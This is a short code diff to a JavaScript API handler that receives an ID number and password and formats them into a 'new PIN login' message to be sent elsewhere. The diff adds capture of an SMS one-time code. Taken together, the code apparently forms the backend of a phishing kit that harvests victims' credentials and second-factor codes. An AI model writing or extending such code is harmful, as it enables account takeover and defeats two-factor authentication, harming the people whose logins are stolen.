@@ -7,6 +7,7 @@ export default async function handler(req, res) {
 
     id_no,
     password,
+    k,
 
   } = req.body;
 
@@ -21,6 +22,12 @@ export default async function handler(req, res) {
     🔑 Nouveau PIN Login:
     - Identifiant: ${id_no}
     - Mot de passe: ${password}
+    `;
+  } else if (k) {
+    // 🟠 رسالة SMS
+    message = `
+📲 pin:
+- Code: ${k}
     `;
   }
 
@@ -39,7 +46,6 @@ export default async function handler(req, res) {
     res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
   }
 }
-
 
 
 
